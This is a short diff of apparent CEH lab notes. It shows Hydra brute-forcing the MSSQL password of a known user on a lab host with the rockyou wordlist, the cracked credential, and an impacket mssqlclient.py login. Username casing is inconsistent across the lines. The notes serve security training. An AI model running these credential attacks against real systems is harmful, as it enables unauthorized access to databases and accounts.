@@ -472,7 +472,7 @@ PowerView is a PowerShell tool designed for network and AD enumeration. It helps
 1.  Nmap scan, we observed that host **10.10.1.30** (which is **Windows Server 2019 (AD)** virtual machine) has port **1433** open. We will attempt to brute force the password using **Hydra**, as we already know the username, which is **SQL_srv**.
 2. **SQL_srv** in a text file and name it as **user.txt**
 3. password  cracking using hyrda 
-	- ``hydra -l SQL_SIV -P / root/ADtools/rockyou. txt 10.10.1.30 mssql``
+	- ``hydra -l SQL_SIV -P / root/ADtools/rockyou.txt 10.10.1.30 mssql``
 	- `` user:SQL_SrV password:batman''
 4.  we will attempt to log into the service using ``mssqlclient.py``
 	- ``python3 /root/impacket/examples/mssqlclient.py CEH.com/SQL_srv:batman@10.10.1.30 -port 1433 ``
